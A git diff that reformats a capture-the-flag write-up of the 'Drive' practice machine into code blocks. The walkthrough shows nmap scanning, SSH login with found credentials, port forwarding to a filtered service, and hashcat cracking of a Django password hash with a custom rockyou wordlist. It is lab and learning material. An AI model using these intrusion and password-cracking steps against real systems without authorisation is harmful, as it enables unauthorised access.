@@ -1,12 +1,14 @@
 we start the machine with classic port scan:
-	
-	nmap -p- 10.10.11.235
+```bash
+nmap -p- 10.10.11.235
+```
 output:
-	
-	PORT     STATE    SERVICE
-	22/tcp   open     ssh
-	80/tcp   open     http
-	3000/tcp filtered ppp
+```bash
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+3000/tcp filtered ppp
+```
 we have something here, a filtered port and a web server.
 <!-- -->
 I Will start with the web server and go on hoping to get to the filtered port from the inside.
@@ -15,8 +17,9 @@ I tryied to visit the web server via the ip but i got the redirect to the vhost:
 	
 	drive.htb
 so i added the host with:	
-	
-	echo '10.10.11.235	drive.htb' >> /etc/hosts
+```bash
+echo '10.10.11.235	drive.htb' >> /etc/hosts
+```
 now that i can acces the website i created an account and so this:
 	
 ![web dashboard](./pic/dashboard.png)
@@ -54,9 +57,10 @@ I will reach you soon with the token to apply your changes on the repo
 thanks!
 ```
 so now that we have credentials we can log in via ssh:
-	
-	python3 -m pwncat
-	connect ssh://martin@drive.htb
+```bash
+python3 -m pwncat
+connect ssh://martin@drive.htb
+```
 after inputting the password we are in!!!
 now that we are inside the box we need to check also the other files because they contains very important informations.
 <!-- -->
@@ -76,8 +80,9 @@ We also have backups from the past months that are protected from a zip password
 I tried to crack them but the password is too long.
 So it's time to check the filtered port that we found with the scan.
 In fact it is a port 3000 that i forwarded on my localhost machine with that command:
-	
-	ssh -L *:80:127.0.0.1:3000 martin@drive.htb
+```bash	
+ssh -L *:80:127.0.0.1:3000 martin@drive.htb
+```
 after logging in we have the remote port 3000 that was filtered now open on our local machine and we can acces it.
 <!-- -->
 When we visit the port on our browser we got this:
@@ -104,35 +109,37 @@ From all the databases i managed to crack only one user pass,
 the tom password in fact was slightly different every time but with a constant word.
 <!-- -->
 So i tried to create a custom list from rockyou with lines that was containg only that word inside
-	
+```bash
 	grep '[REDACTED]' /usr/share/wordlists/rockyou.txt > rockingtom.txt
+```
 with this new wordlist i tried to aporach the _pbdf2_sha256_ hash:
-	
+```bash
 	hashcat -a 0 -m 10000 tom.hash rockingtom.txt
+```
 output:
 ```	
-	[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
 
-	Session..........: hashcat
-	Status...........: Running
-	Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
-	Hash.Target......: pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQO...9gtro=
-	Time.Started.....: Tue Oct 17 00:46:52 2023 (11 secs)
-	Time.Estimated...: Tue Oct 17 00:51:11 2023 (4 mins, 8 secs)
-	Kernel.Feature...: Pure Kernel
-	Guess.Base.......: File (rockingtom.txt)
-	Guess.Queue......: 1/1 (100.00%)
-	Speed.#1.........:       75 H/s (8.79ms) @ Accel:256 Loops:256 Thr:1 Vec:8
-	Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
-	Progress.........: 0/18729 (0.00%)
-	Rejected.........: 0/0 (0.00%)
-	Restore.Point....: 0/18729 (0.00%)
-	Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:297984-298240
-	Candidate.Engine.: Device Generator
-	Candidates.#1....: [REDACTED] -> [REDACTED]
-	Hardware.Mon.#1..: Util: 97%
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
+Hash.Target......: pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQO...9gtro=
+Time.Started.....: Tue Oct 17 00:46:52 2023 (11 secs)
+Time.Estimated...: Tue Oct 17 00:51:11 2023 (4 mins, 8 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (rockingtom.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       75 H/s (8.79ms) @ Accel:256 Loops:256 Thr:1 Vec:8
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 0/18729 (0.00%)
+Rejected.........: 0/0 (0.00%)
+Restore.Point....: 0/18729 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:297984-298240
+Candidate.Engine.: Device Generator
+Candidates.#1....: [REDACTED] -> [REDACTED]
+Hardware.Mon.#1..: Util: 97%
 
-	pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$[REDACTED]26QCQjwZ9lKhfk9gtro=:[REDACTED]
+pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$[REDACTED]26QCQjwZ9lKhfk9gtro=:[REDACTED]
 ```
 now that we cracked the hash we can log as tom and submit the user flag and go straight to the root flag.
 <!-- -->
